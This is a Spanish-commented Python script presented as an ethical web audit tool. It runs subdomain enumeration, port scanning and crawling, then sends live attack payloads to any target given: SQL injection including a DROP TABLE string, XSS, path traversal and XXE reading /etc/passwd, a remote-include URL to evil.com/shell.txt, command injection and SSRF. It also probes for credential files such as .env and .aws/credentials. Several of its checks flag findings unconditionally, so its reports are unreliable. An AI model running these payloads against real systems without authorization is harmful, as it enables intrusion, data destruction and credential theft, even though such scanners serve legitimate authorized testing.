#!/usr/bin/env python3
"""
🕷️ WEB SPIDER AUDIT TOOL - by Daniel Nezuko
🔍 Auditoría completa de seguridad web con descubrimiento de subdominios
⚡ Para pruebas éticas en sistemas autorizados
"""

import requests
import json
import time
import sys
import os
import argparse
import threading
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import dns.resolver
import socket
import ssl
import urllib3
from datetime import datetime

# Desactivar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebSpiderAudit:
    def __init__(self, target, threads=10, timeout=10):
        if not target.startswith(('http://', 'https://')):
            self.target = f"https://{target}"
        else:
            self.target = target
            
        self.domain = urlparse(self.target).netloc
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.found_subdomains = []
        self.vulnerabilities = []
        self.sensitive_files = []
        self.endpoints = []
        
        # Headers personalizados
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })

    def print_banner(self):
        banner = """
    ╔═══════════════════════════════════════════════╗
    ║            🕷️ WEB SPIDER AUDIT TOOL           ║
    ║              by Daniel Nezuko                 ║
    ║         Auditoría Completa de Seguridad       ║
    ╚═══════════════════════════════════════════════╝
        """
        print(banner)

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",    # Azul
            "SUCCESS": "\033[92m", # Verde
            "WARNING": "\033[93m", # Amarillo
            "ERROR": "\033[91m",   # Rojo
            "CRITICAL": "\033[95m" # Magenta
        }
        reset = "\033[0m"
        print(f"{colors.get(level, '')}[{timestamp}] {level}: {message}{reset}")

    # 1. DESCUBRIMIENTO DE SUBDOMINIOS
    def discover_subdomains(self):
        self.log("Iniciando descubrimiento de subdominios...", "INFO")
        
        subdomain_list = [
            'www', 'api', 'admin', 'test', 'dev', 'staging', 'mail', 'ftp', 'cpanel',
            'webmail', 'portal', 'blog', 'shop', 'store', 'app', 'apps', 'secure',
            'dashboard', 'panel', 'control', 'manager', 'system', 'ns1', 'ns2',
            'cdn', 'static', 'media', 'img', 'images', 'js', 'css', 'download',
            'upload', 'backup', 'db', 'database', 'sql', 'mysql', 'oracle',
            'server', 'servers', 'vpn', 'remote', 'ssh', 'smtp', 'pop', 'imap',
            'webdisk', 'webdev', 'whm', 'forum', 'forums', 'community', 'support',
            'help', 'docs', 'wiki', 'status', 'monitor', 'tracker', 'git', 'svn',
            'm', 'mobile', 'tv', 'video', 'live', 'stream', 'chat', 'irc',
            'news', 'events', 'calendar', 'files', 'share', 'shared', 'pub',
            'public', 'secure', 'auth', 'authn', 'login', 'signin', 'account',
            'accounts', 'billing', 'pay', 'payment', 'payments', 'invoice',
            'invoices', 'cart', 'checkout', 'shop', 'store', 'buy', 'purchase'
        ]
        
        discovered = []
        
        def check_subdomain(subdomain):
            url = f"https://{subdomain}.{self.domain}"
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                if response.status_code < 400:
                    discovered.append(url)
                    self.log(f"Subdominio encontrado: {url} [{response.status_code}]", "SUCCESS")
            except:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_subdomain, subdomain_list)
        
        self.found_subdomains = discovered
        return discovered

    # 2. ESCANEO DE PUERTOS COMUNES
    def port_scan(self):
        self.log("Iniciando escaneo de puertos...", "INFO")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 2082, 2083, 2086, 2087, 2095, 2096, 3306, 3389, 5432, 8080, 8443]
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.domain, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
                    self.log(f"Puerto abierto: {port}", "SUCCESS")
            except:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(scan_port, common_ports)
        
        return open_ports

    # 3. DETECCIÓN DE TECNOLOGÍAS
    def detect_tech(self):
        self.log("Detectando tecnologías del servidor...", "INFO")
        
        tech_info = {}
        
        try:
            response = self.session.get(self.target, timeout=self.timeout, verify=False)
            headers = response.headers
            
            # Detectar servidor web
            if 'server' in headers:
                tech_info['server'] = headers['server']
                self.log(f"Servidor web: {headers['server']}", "INFO")
            
            # Detectar framework
            if 'x-powered-by' in headers:
                tech_info['framework'] = headers['x-powered-by']
                self.log(f"Framework: {headers['x-powered-by']}", "INFO")
            
            # Detectar por contenido
            content = response.text.lower()
            tech_patterns = {
                'wordpress': ['wp-content', 'wp-includes', 'wordpress'],
                'joomla': ['joomla', 'media/jui', 'templates/system'],
                'drupal': ['drupal', 'sites/all'],
                'laravel': ['laravel', 'csrf-token'],
                'react': ['react', 'react-dom'],
                'vue': ['vue', 'vue.js'],
                'angular': ['angular', 'ng-'],
                'jquery': ['jquery'],
                'bootstrap': ['bootstrap']
            }
            
            for tech, patterns in tech_patterns.items():
                if any(pattern in content for pattern in patterns):
                    tech_info[tech] = True
                    self.log(f"Tecnología detectada: {tech}", "SUCCESS")
                    
        except Exception as e:
            self.log(f"Error en detección de tecnologías: {e}", "ERROR")
            
        return tech_info

    # 4. CRAWLING DE ENLACES Y ENDPOINTS
    def crawl_website(self, max_pages=100):
        self.log(f"Iniciando crawling del sitio (máx {max_pages} páginas)...", "INFO")
        
        visited = set()
        to_visit = [self.target]
        
        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            
            if url in visited:
                continue
                
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                visited.add(url)
                self.endpoints.append(url)
                
                # Extraer enlaces
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    if self.domain in full_url and full_url not in visited and full_url not in to_visit:
                        to_visit.append(full_url)
                        
            except Exception as e:
                continue
                
        self.log(f"Crawling completado. {len(visited)} páginas encontradas.", "SUCCESS")
        return list(visited)

    # 5. ESCANEO DE VULNERABILIDADES
    def vulnerability_scan(self):
        self.log("Iniciando escaneo de vulnerabilidades...", "INFO")
        
        vuln_tests = [
            self.test_sql_injection,
            self.test_xss,
            self.test_lfi,
            self.test_rfi,
            self.test_command_injection,
            self.test_xxe,
            self.test_ssrf,
            self.test_idor,
            self.test_jwt_weak,
            self.test_cors_misconfig
        ]
        
        for test in vuln_tests:
            try:
                test()
            except Exception as e:
                self.log(f"Error en test {test.__name__}: {e}", "ERROR")

    def test_sql_injection(self):
        self.log("Probando SQL Injection...", "INFO")
        payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users", "1' UNION SELECT 1,2,3--"]
        
        for payload in payloads:
            test_url = f"{self.target}/?id={payload}"
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                if "sql" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'SQL Injection',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    self.log(f"Posible SQLi encontrado: {test_url}", "CRITICAL")
                    break
            except:
                pass

    def test_xss(self):
        self.log("Probando XSS...", "INFO")
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
        
        for payload in payloads:
            test_url = f"{self.target}/?search={payload}"
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                if payload in response.text:
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'MEDIUM'
                    })
                    self.log(f"Posible XSS encontrado: {test_url}", "WARNING")
                    break
            except:
                pass

    def test_lfi(self):
        self.log("Probando LFI...", "INFO")
        payloads = ["../../../../etc/passwd", "....//....//....//etc/passwd"]
        
        for payload in payloads:
            test_url = f"{self.target}/?file={payload}"
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                if "root:" in response.text:
                    self.vulnerabilities.append({
                        'type': 'LFI',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'HIGH'
                    })
                    self.log(f"Posible LFI encontrado: {test_url}", "CRITICAL")
                    break
            except:
                pass

    def test_rfi(self):
        self.log("Probando RFI...", "INFO")
        payload = "http://evil.com/shell.txt"
        test_url = f"{self.target}/?include={payload}"
        
        try:
            response = self.session.get(test_url, timeout=self.timeout, verify=False)
            # RFI es difícil de detectar automáticamente, se marca como posible
            self.vulnerabilities.append({
                'type': 'Possible RFI',
                'url': test_url,
                'payload': payload,
                'severity': 'HIGH'
            })
            self.log(f"Posible RFI: {test_url}", "WARNING")
        except:
            pass

    def test_command_injection(self):
        self.log("Probando Command Injection...", "INFO")
        payloads = ["; whoami", "| whoami", "&& whoami"]
        
        for payload in payloads:
            test_url = f"{self.target}/?cmd=ping{payload}"
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                if "www-data" in response.text or "root" in response.text or "nt authority" in response.text.lower():
                    self.vulnerabilities.append({
                        'type': 'Command Injection',
                        'url': test_url,
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
                    self.log(f"Posible Command Injection: {test_url}", "CRITICAL")
                    break
            except:
                pass

    def test_xxe(self):
        self.log("Probando XXE...", "INFO")
        xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"""
        
        try:
            response = self.session.post(self.target, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=self.timeout, verify=False)
            if "root:" in response.text:
                self.vulnerabilities.append({
                    'type': 'XXE',
                    'url': self.target,
                    'payload': 'XML External Entity',
                    'severity': 'HIGH'
                })
                self.log("Posible XXE encontrado", "CRITICAL")
        except:
            pass

    def test_ssrf(self):
        self.log("Probando SSRF...", "INFO")
        payloads = ["http://localhost:22", "http://127.0.0.1:3306"]
        
        for payload in payloads:
            test_url = f"{self.target}/?url={payload}"
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                # Detección básica de SSRF
                self.vulnerabilities.append({
                    'type': 'Possible SSRF',
                    'url': test_url,
                    'payload': payload,
                    'severity': 'MEDIUM'
                })
                self.log(f"Posible SSRF: {test_url}", "WARNING")
            except:
                pass

    def test_idor(self):
        self.log("Probando IDOR...", "INFO")
        test_urls = [f"{self.target}/user/1", f"{self.target}/profile/1", f"{self.target}/order/1"]
        
        for test_url in test_urls:
            try:
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'Possible IDOR',
                        'url': test_url,
                        'payload': 'Direct object reference',
                        'severity': 'MEDIUM'
                    })
                    self.log(f"Posible IDOR: {test_url}", "WARNING")
            except:
                pass

    def test_jwt_weak(self):
        self.log("Probando JWT débiles...", "INFO")
        # Esta es una implementación básica
        jwt_tokens = ["eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"]
        
        for token in jwt_tokens:
            self.vulnerabilities.append({
                'type': 'JWT Weak',
                'url': 'N/A',
                'payload': 'Check JWT configuration',
                'severity': 'MEDIUM'
            })
            self.log("Revisar configuración JWT manualmente", "INFO")

    def test_cors_misconfig(self):
        self.log("Probando CORS misconfiguration...", "INFO")
        try:
            response = self.session.options(self.target, headers={'Origin': 'https://evil.com'}, timeout=self.timeout, verify=False)
            if 'https://evil.com' in response.headers.get('Access-Control-Allow-Origin', ''):
                self.vulnerabilities.append({
                    'type': 'CORS Misconfiguration',
                    'url': self.target,
                    'payload': 'Wildcard origin allowed',
                    'severity': 'MEDIUM'
                })
                self.log("CORS misconfiguration encontrado", "WARNING")
        except:
            pass

    # 6. BUSQUEDA DE ARCHIVOS SENSIBLES
    def find_sensitive_files(self):
        self.log("Buscando archivos sensibles...", "INFO")
        
        files = [
            "/.env", "/.git/config", "/.htaccess", "/web.config", "/robots.txt",
            "/sitemap.xml", "/backup.zip", "/database.sql", "/dump.sql",
            "/phpinfo.php", "/test.php", "/admin.php", "/config.php",
            "/.DS_Store", "/.aws/credentials", "/wp-config.php",
            "/app/config.py", "/settings.py", "/config/database.php",
            "/storage/logs/laravel.log", "/debug.log", "/error.log"
        ]
        
        found_files = []
        
        def check_file(file_path):
            url = f"{self.target}{file_path}"
            try:
                response = self.session.get(url, timeout=self.timeout, verify=False)
                if response.status_code == 200:
                    found_files.append(url)
                    self.log(f"Archivo encontrado: {url}", "SUCCESS")
            except:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_file, files)
        
        self.sensitive_files = found_files
        return found_files

    # 7. GENERAR REPORTE COMPLETO
    def generate_report(self):
        self.log("Generando reporte de auditoría...", "INFO")
        
        report = f"""
╔═══════════════════════════════════════════════╗
║           REPORTE DE AUDITORÍA WEB           ║
║              by Daniel Nezuko                ║
╚═══════════════════════════════════════════════╝

FECHA: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
OBJETIVO: {self.target}
DOMINIO: {self.domain}

RESUMEN EJECUTIVO:
• Subdominios encontrados: {len(self.found_subdomains)}
• Vulnerabilidades detectadas: {len(self.vulnerabilities)}
• Archivos sensibles: {len(self.sensitive_files)}
• Endpoints escaneados: {len(self.endpoints)}

DETALLES DE LA AUDITORÍA:

1. SUBDOMINIOS ENCONTRADOS:
{chr(10).join(['   • ' + sub for sub in self.found_subdomains])}

2. VULNERABILIDADES IDENTIFICADAS:
"""
        
        for vuln in self.vulnerabilities:
            report += f"""
   • TIPO: {vuln['type']}
     URL: {vuln['url']}
     PAYLOAD: {vuln['payload']}
     SEVERIDAD: {vuln['severity']}
"""
        
        report += f"""
3. ARCHIVOS SENSIBLES ENCONTRADOS:
{chr(10).join(['   • ' + file for file in self.sensitive_files])}

4. RECOMENDACIONES DE SEGURIDAD:

"""
        
        # Recomendaciones basadas en hallazgos
        if any(v['severity'] == 'CRITICAL' for v in self.vulnerabilities):
            report += "   • CRÍTICO: Resolver vulnerabilidades críticas inmediatamente\n"
        
        if len(self.vulnerabilities) > 0:
            report += "   • ALTO: Implementar WAF y revisar código\n"
        
        if len(self.sensitive_files) > 0:
            report += "   • MEDIO: Restringir acceso a archivos sensibles\n"
        
        report += "   • BÁSICO: Mantener software actualizado\n"
        report += "   • BÁSICO: Implementar HTTPS estricto\n"
        report += "   • BÁSICO: Configurar headers de seguridad\n"

        # Guardar reporte
        filename = f"auditoria_{self.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        self.log(f"Reporte guardado como: {filename}", "SUCCESS")
        return report

    # FUNCIÓN PRINCIPAL
    def full_audit(self):
        self.print_banner()
        self.log(f"Iniciando auditoría completa para: {self.target}", "INFO")
        
        start_time = time.time()
        
        # Ejecutar todas las pruebas
        self.discover_subdomains()
        self.port_scan()
        tech_info = self.detect_tech()
        self.crawl_website()
        self.vulnerability_scan()
        self.find_sensitive_files()
        
        # Generar reporte
        report = self.generate_report()
        
        end_time = time.time()
        duration = end_time - start_time
        
        self.log(f"Auditoría completada en {duration:.2f} segundos", "SUCCESS")
        
        # Mostrar resumen en consola
        print("\n" + "="*60)
        print("RESUMEN EJECUTIVO:")
        print(f"• Subdominios: {len(self.found_subdomains)}")
        print(f"• Vulnerabilidades: {len(self.vulnerabilities)}")
        print(f"• Archivos sensibles: {len(self.sensitive_files)}")
        print(f"• Tiempo total: {duration:.2f}s")
        print("="*60)
        
        return report

def main():
    parser = argparse.ArgumentParser(description='Web Spider Audit Tool by Daniel Nezuko')
    parser.add_argument('target', help='URL objetivo (ej: ejemplo.com)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Hilos concurrentes (default: 10)')
    parser.add_argument('-T', '--timeout', type=int, default=10, help='Timeout en segundos (default: 10)')
    
    args = parser.parse_args()
    
    auditor = WebSpiderAudit(args.target, args.threads, args.timeout)
    auditor.full_audit()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 web_spider_audit.py <URL> [opciones]")
        print("Ejemplo: python3 web_spider_audit.py ejemplo.com")
        print("Ejemplo: python3 web_spider_audit.py https://ejemplo.com -t 20 -T 15")
        sys.exit(1)
    
    main()